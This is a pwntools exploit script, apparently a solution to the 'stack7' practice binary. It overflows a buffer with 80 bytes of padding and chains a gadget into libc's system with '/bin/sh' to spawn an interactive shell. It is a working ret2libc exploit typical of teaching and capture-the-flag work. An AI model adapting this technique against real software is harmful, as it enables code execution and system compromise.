from pwn import *

elf = ELF('./stack7')
p = process(elf.path)

# use the process's libc for runtime offsets
libc = p.libc
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

# 0x8048492 : pop ebx ; pop ebp ; ret
gadget_addr = 0x8048492

payload = flat(
    b'A' * 80,
    gadget_addr,
    0x41414141,  # ebx
    0x42424242,  # ebp
    system,
    0x43434343,  # return address
    bin_sh
)

log.info(f"system@ {hex(system)}")
log.info(f"/bin/sh@ {hex(bin_sh)}")

p.sendlineafter(b'input path please: ', payload)
p.interactive()
